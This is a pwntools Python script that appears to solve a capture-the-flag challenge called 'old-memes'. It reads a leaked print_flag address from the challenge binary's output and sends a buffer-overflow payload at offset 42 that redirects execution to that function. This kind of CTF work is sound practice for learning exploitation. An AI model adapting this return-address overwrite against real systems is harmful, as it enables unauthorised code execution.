#!/usr/bin/env python3

from pwn import *

exe = ELF("./old-memes")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("old-memes-never-die.ctf.zone", 4242)

    return r


def main():
    r = conn()
    offset = 42
    print_flag_addr = int(r.recvline().split(b'(do with this information what you want, but the print_flag function can be found here: ')[1].strip(b'\n').strip(b')').decode(), 16)
    payload = flat({offset: [
            print_flag_addr
        ]})


    # good luck pwning :)
    r.sendlineafter(b'>', b'what?')
    r.sendlineafter(b'>',payload)
    r.interactive()


if __name__ == "__main__":
    main()

